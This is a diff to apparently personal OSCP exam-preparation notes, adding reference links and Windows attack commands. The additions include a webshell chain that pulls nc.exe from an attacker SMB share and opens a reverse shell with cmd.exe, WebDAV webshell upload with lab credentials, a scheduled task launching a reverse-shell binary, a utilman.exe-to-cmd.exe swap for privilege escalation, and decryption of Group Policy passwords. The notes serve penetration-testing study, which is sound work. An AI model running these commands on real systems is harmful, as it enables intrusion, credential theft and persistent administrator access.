@@ -2,7 +2,14 @@
 Preparation for OSCP
 
 https://gist.github.com/m8r0wn/b6654989035af20a1cb777b61fbc29bf \
-https://0xsp.com/offensive/privilege-escalation-cheatsheet
+https://0xsp.com/offensive/privilege-escalation-cheatsheet \
+https://pentesting.zeyu2001.com/proving-grounds/get-to-work/nickel \
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md \
+
+
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Office%20-%20Attacks.md
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Powershell%20-%20Cheatsheet.md
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Persistence.md
 
 ## RECON
 
@@ -238,6 +245,14 @@ https://book.hacktricks.xyz/windows/ntlm/places-to-steal-ntlm-creds
 
 ### Shells
 
+RCE Webshell
+```Shell
+impacket-smbserver folder . -smb2support -username admin -password admin
+curl -s -X GET --data-urlencode 'cmd=net use Z: \\192.168.49.240\folder /u:admin admin' http://192.168.240.122/webshell.asp
+curl -s -X GET --data-urlencode 'cmd=copy \\192.168.49.240\folder\nc.exe C:\Windows\Temp\nc.exe' http://192.168.240.122/webshell.asp
+curl -s -X GET --data-urlencode 'cmd=C:\Windows\Temp\nc.exe 192.168.49.240 443 -e cmd.exe ' http://192.168.240.122/webshell.asp 
+```
+
 ```Shell
 https://github.com/Hackplayers/evil-winrm
 #Winrm
@@ -315,10 +330,13 @@ dav:/> move cmd.txt cmd.aspx
 ```Shell
 # davtest -url http://10.10.10.15
 # davtest -url http://192.168.102.127:8000/imagefs/ab367e7961f629bc/images/
+# davtest -url http://192.168.240.122 -auth fmcsorley:CrabSharkJellyfish192
+# curl -u fmcsorley:CrabSharkJellyfish192 -T webshell.asp http://192.168.240.122 
 ```
 
 #### LFI / RFI
 https://notchxor.github.io/oscp-notes/2-web/LFI-RFI/
+
 
 ```Shell
 wfuzz -c -t 500 --hc=404 --hw=35,41,32,39 -w paths.txt http://192.168.142.53:4443/site/index.php?page=FUZZ
@@ -518,7 +536,10 @@ Ciphers +aes128-cbc
 
 ## Priv
 https://github.com/SecWiki/windows-kernel-exploits \
-https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md \
+https://notchxor.github.io/oscp-notes/4-win-privesc/1-initial/ \
+https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/ \
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Persistence.md
 
 #PowerUp.ps1
 ```Shell
@@ -560,8 +581,14 @@ Find-PathDLLHijack
 ```
 
 ### Task
+https://www.hackingarticles.in/windows-privilege-escalation-scheduled-task-job-t1573-005/
 ```Shell
 schtasks /query /fo LIST /v | select-string 'TFTP' -context 10 
+
+# Create the scheduled tasks to run once at 00.00
+schtasks /create /sc ONCE /st 00:00 /tn "Device-Synchronize" /tr C:\Temp\revshell.exe
+# Force run it now !
+schtasks /run /tn "Device-Synchronize"
 ```
 
 ### Weak services
@@ -573,13 +600,54 @@ whoami /priv
 shutdown -r
 ```
 
+### SeRestorePrivilege 
+https://github.com/gtworek/PSBits/blob/master/Misc/EnableSeRestorePrivilege.ps1
+
+```Shell
+whoami /priv
+Evil-WinRM* PS C:\Users\svc_apache$\Documents> upload EnableSeRestorePrivilege.ps1
+./EnableSeRestorePrivilege.ps1
+move C:\Windows\System32\utilman.exe C:\Windows\System32\utilman.old
+move C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe
+
+rdesktop
+WIN + U (CMD + U
+```
+
 ### Group policy preferences
-https://adsecurity.org/?p=2288
-findstr /S /I cpassword \\<FQDN>\sysvol\<FQDN>\policies\*.xml
+https://adsecurity.org/?p=2288 \
 https://raw.githubusercontent.com/BustedSec/gpp-decrypt/master/gpp-decrypt.rb
 ```Shell
+findstr /S /I cpassword \\<FQDN>\sysvol\<FQDN>\policies\*.xml
 ruby gpp-decrypt.rb
 ```
+
+### Always install elevated
+https://notchxor.github.io/oscp-notes/4-win-privesc/10-always-install-elevated/
+
+### insecure registry permissions
+https://notchxor.github.io/oscp-notes/4-win-privesc/12-insecure-registry/
+  
+  
+### RunAS
+https://notchxor.github.io/oscp-notes/4-win-privesc/14-runas/
+
+### UAC bypass
+https://notchxor.github.io/oscp-notes/4-win-privesc/16-UAC/
+
+### stored credentials
+https://notchxor.github.io/oscp-notes/4-win-privesc/2-stored-credentials/
+
+### DLL
+https://notchxor.github.io/oscp-notes/4-win-privesc/4-dll-injection/ \
+https://notchxor.github.io/oscp-notes/4-win-privesc/6-dll-hijacking/
+
+### POTATO
+https://notchxor.github.io/oscp-notes/4-win-privesc/7-potato/
+
+### unquoted service path 
+https://notchxor.github.io/oscp-notes/4-win-privesc/9-unquoted-service-path/
+
 
 ### Exploits
 
